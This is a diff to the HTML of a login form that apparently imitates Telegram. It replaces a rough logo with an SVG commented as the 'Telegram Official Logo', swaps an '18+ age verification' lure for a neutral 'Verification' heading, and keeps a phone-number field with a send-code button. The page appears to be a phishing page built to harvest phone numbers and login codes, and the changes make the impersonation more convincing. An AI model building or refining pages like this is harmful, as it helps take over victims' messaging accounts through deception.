@@ -9,22 +9,24 @@
 <body>
     <div class="auth-container">
         <div class="glass">
-            <svg class="telegram-logo" viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg">
-                <circle cx="120" cy="120" r="120" fill="url(#gradient)"/>
-                <defs>
-                    <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="100%">
-                        <stop offset="0%" style="stop-color:#29b6f6;stop-opacity:1" />
-                        <stop offset="100%" style="stop-color:#1976d2;stop-opacity:1" />
-                    </linearGradient>
-                </defs>
-                <path d="M60 150 L80 90 M100 80 L140 160 M80 110 L120 140" stroke="white" stroke-width="8" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
-            </svg>
+            <!-- Telegram Official Logo -->
+            <div style="width: 120px; height: 120px; margin-bottom: 30px; display: flex; align-items: center; justify-content: center;">
+                <svg viewBox="0 0 240 240" width="120" height="120" xmlns="http://www.w3.org/2000/svg">
+                    <defs>
+                        <linearGradient id="tg-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" style="stop-color:#0088cc;stop-opacity:1" />
+                            <stop offset="100%" style="stop-color:#0088cc;stop-opacity:1" />
+                        </linearGradient>
+                    </defs>
+                    <!-- Circle background -->
+                    <circle cx="120" cy="120" r="120" fill="url(#tg-gradient)"/>
+                    <!-- Telegram paper airplane -->
+                    <path d="M55 130 L110 100 Q120 95 110 90 L60 65 Q55 62 55 70 L70 115 L110 100 M110 100 L170 50 Q180 45 175 55 L95 150 Q90 160 80 155 Z" 
+                          fill="white" stroke="none"/>
+                </svg>
+            </div>
 
-            <div class="emoji-18plus">🔞</div>
-
-            <h1 class="auth-title" data-i18n="verify">Age verification 18+</h1>
-            
-            <p class="auth-subtitle" data-i18n="enter_phone">Enter your phone number</p>
+            <h1 class="auth-title" data-i18n="verify">Verification</h1>
 
             <form id="authForm">
                 <div class="input-group">
@@ -32,11 +34,10 @@
                         type="tel" 
                         class="input-field" 
                         id="phone" 
-                        placeholder="1234567890"
+                        placeholder="+1234567890"
                         data-i18n="phone_placeholder"
                         required
                     >
-                    <p class="help-text" data-i18n="help_phone" style="display: none;">Use format: +1234567890</p>
                 </div>
 
                 <button type="submit" class="btn btn-primary" data-i18n="send_code">
